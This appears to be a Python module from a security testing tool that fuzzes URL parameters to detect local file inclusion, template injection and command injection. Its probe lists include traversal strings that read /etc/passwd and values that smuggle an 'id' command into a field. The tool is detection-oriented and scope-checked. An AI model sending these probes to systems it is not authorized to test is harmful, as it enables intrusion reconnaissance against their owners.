"""
modules/offensive/param_fuzzer.py
Advanced parameter fuzzer — LFI / SSTI / command-injection DETECTION (authorized).

NON-DESTRUCTIVE: sends only READ/harmless probes and looks for an EVIDENCE
signature in the response. It PROVES a flaw without exploiting or causing harm:
  * LFI   : ../../etc/passwd  -> 'root:x:0:0' signature in the response
  * SSTI  : {{7*7}} / ${7*7}  -> '49' (evaluated) signature in the response
  * CMDi  : ;id and |id       -> 'uid=NN(' signature in the response (read-only 'id' command)
NEVER uses destructive payloads (rm, drop, shutdown, etc.). In-scope targets only.
"""
from __future__ import annotations

import logging
import re
from dataclasses import dataclass, field
from urllib.parse import urlsplit, parse_qs, urlencode, urlunsplit

from core.scope_guard import assert_in_scope
from modules.offensive._requester import request

log = logging.getLogger("cerberus.fuzz")

PROBES = {
    "LFI": {"values": ["../../../../../../etc/passwd", "....//....//etc/passwd"],
            "signature": re.compile(r"root:.*?:0:0:"), "severity": "CRITICAL"},
    "SSTI": {"values": ["cerb{{7*7}}xy", "cerb${7*7}xy", "cerb<%=7*7%>xy"],
             "signature": re.compile(r"cerb49xy"), "severity": "HIGH"},
    "CMD_INJECTION": {"values": ["1;id", "1|id", "1`id`"],
                      "signature": re.compile(r"uid=\d+\("), "severity": "CRITICAL"},
}


@dataclass
class FuzzFinding:
    param: str
    kind: str
    severity: str
    evidence: str


@dataclass
class FuzzReport:
    target: str
    params_tested: list = field(default_factory=list)
    findings: list = field(default_factory=list)


def _set(url: str, param: str, value: str) -> str:
    parts = urlsplit(url)
    q = parse_qs(parts.query, keep_blank_values=True)
    q[param] = [value]
    return urlunsplit((parts.scheme, parts.netloc, parts.path,
                       urlencode({k: v[0] for k, v in q.items()}), ""))


class ParamFuzzer:
    def __init__(self, target: str) -> None:
        assert_in_scope(target)
        self.target = target if "://" in target else "http://" + target

    def run(self) -> FuzzReport:
        rep = FuzzReport(target=self.target)
        params = list(parse_qs(urlsplit(self.target).query, keep_blank_values=True).keys())
        if not params:
            rep.findings.append(FuzzFinding("-", "INFO", "INFO",
                "URL has no parameters (e.g. add ?page=1)."))
            return rep
        baseline = request(self.target)
        for p in params:
            rep.params_tested.append(p)
            for kind, cfg in PROBES.items():
                for val in cfg["values"]:
                    r = request(_set(self.target, p, val))
                    if not r.body:
                        continue
                    m = cfg["signature"].search(r.body)
                    if m and not cfg["signature"].search(baseline.body or ""):
                        rep.findings.append(FuzzFinding(p, kind, cfg["severity"],
                            f"Evidence signature found in response: '{m.group(0)[:40]}'"))
                        break  # evidence found for this type; skip the other variants
        log.info("Param fuzz (%s): %d parameters, %d findings.",
                 self.target, len(rep.params_tested), len(rep.findings))
        return rep
